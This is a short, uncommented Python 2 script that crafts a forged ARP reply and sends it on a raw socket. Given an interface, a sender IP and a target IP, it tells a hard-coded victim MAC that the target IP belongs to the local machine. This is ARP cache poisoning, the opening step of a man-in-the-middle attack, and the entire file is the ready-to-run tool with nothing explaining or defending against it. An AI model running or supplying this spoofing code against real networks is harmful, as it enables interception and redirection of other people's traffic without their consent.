from socket import *
import sys
import uuid
import binascii

def ip2hex(ip):
  return binascii.hexlify(inet_aton(ip))

name = sys.argv[0]

if len(sys.argv) != 4:
  exit('Usage : ' + name + ' interface sender_ip target_ip')

interface = sys.argv[1]
sender_ip = sys.argv[2]
target_ip = sys.argv[3]

target_mac = ''.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)[::-1]])
sender_mac = '000c290b51b0'

eth_p = sender_mac
eth_p += target_mac
eth_p += '0806'

arp_p = '0001'
arp_p += '0800'
arp_p += '06'
arp_p += '04'
arp_p += '0002'
arp_p += target_mac
arp_p += ip2hex(target_ip)
arp_p += sender_mac
arp_p += ip2hex(sender_ip)

arp_reply = eth_p + arp_p

s = socket(AF_PACKET, SOCK_RAW)
s.bind((interface, 0))

s.send(arp_reply.decode('hex'))
